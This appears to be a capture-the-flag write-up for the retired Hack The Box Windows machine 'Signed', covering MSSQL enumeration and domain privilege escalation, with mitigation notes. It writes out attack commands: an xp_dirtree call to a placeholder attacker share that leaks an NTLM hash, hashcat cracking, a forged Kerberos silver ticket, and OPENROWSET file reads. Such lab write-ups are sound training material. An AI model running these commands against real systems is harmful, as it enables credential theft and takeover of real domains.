---
machine: Signed
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, mssql, ntlm, kerberos, silver-ticket, openrowset, godpotato, privesc]
---

# Signed — Hack The Box (Windows)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Start with local MSSQL credentials. `xp_dirtree` makes the service authenticate to an attacker share and `mssqlsvc`'s NetNTLMv2 hash cracks. With that account, forge a silver ticket including the IT group RID to become `sysadmin`; `OPENROWSET(BULK ...)` reads files as Administrator and PowerShell history reveals the password. There are also NTLM relay and `SeImpersonatePrivilege` token recovery paths.

## Recon

```bash
nmap -Pn -sCV -p1433 <IP>
```

- Only `1433` MSSQL Server 2022 on a DC.
- Initial credentials for a local MSSQL user.
- NTLM and Kerberos available; the domain is `SIGNED.HTB`.

## Enumeration

With `mssqlclient.py`, confirm the account is not `sysadmin` and `xp_cmdshell` is disabled. `xp_dirtree` works and enumerates the filesystem. `--rid-brute` lists users and groups, including IT with RID 1105 and `mssqlsvc` with 1103.

## Foothold

Run `xp_dirtree \\<ATTACKER>\share`; Responder captures `mssqlsvc`'s NetNTLMv2, cracked with hashcat mode 5600. The password works for Windows integrated authentication in MSSQL.

```bash
# coercion and capture
SQL> xp_dirtree \\<ATTACKER>\share
hashcat -m 5600 mssqlsvc.hash rockyou.txt
# silver ticket
ticketer.py -nthash <HASH> -domain-sid <SID> -domain signed.htb \
  -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105 Administrator
KRB5CCNAME=Administrator.ccache mssqlclient.py -no-pass -k DC01.signed.htb
SQL> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS x;```

## Lateral movement

With `mssqlsvc`'s NTLM hash, forge a silver ticket for `MSSQLSvc/DC01.signed.htb:1433` and add RID 1105 (IT). The ticket grants `sysadmin`; `OPENROWSET(BULK ...)` reads files with the ticket's groups, including Administrator's PowerShell history.

## Privilege escalation

The history contains the password used to reset Administrator. Alternatively, create a malicious DNS record, coerce DC authentication and relay to WinRM; or recover `mssqlsvc`'s original token with `SeImpersonatePrivilege` and use GodPotato. Any path gives Administrator.

## Evidence

- `xp_dirtree` and `mssqlsvc` hash.
- IT RIDs and `sysadmin` silver ticket.
- `OPENROWSET` read and PowerShell history.
- Alternate relay and GodPotato paths.

## Lessons learned

- `xp_dirtree` is an authentication coercion primitive.
- A silver ticket can include arbitrary groups.
- `OPENROWSET(BULK)` reads files in the ticket context.
- Admin shell history leaks passwords.

## Mitigation and detection

- Disable `xp_dirtree` and restrict SMB coercion.
- Rotate service passwords and use gMSA.
- Enforce SMB signing and limit NTLM.
- Audit `sysadmin`, Kerberos tickets and `OPENROWSET`.

## References

- [0xdf — Signed](https://0xdf.gitlab.io/2026/02/07/htb-signed.html)
- [IppSec — Signed](https://www.youtube.com/watch?v=d7FCnR6YS_E)
- [Hack The Box — Signed](https://app.hackthebox.com/machines/signed)
